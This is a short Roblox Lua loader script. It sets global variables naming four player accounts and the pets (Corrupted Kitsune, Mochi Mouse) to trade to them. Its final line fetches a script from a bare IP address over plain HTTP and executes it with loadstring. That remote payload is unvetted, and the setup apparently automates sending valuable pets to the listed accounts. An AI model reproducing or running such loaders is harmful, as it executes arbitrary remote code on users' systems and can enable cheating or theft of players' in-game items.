repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "1"

_G.HostName = {
    ["BaruOd74942"] = "Mochi Mouse",
    ["EltoAr35246"] = "Corrupted Kitsune",
    ["SairMeLi7406"] = "Corrupted Kitsune",
    ["VarnBu6588"] = "Corrupted Kitsune",
}

_G.SelectPetForTrade = {
    "Corrupted Kitsune",
    "Mochi Mouse",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()
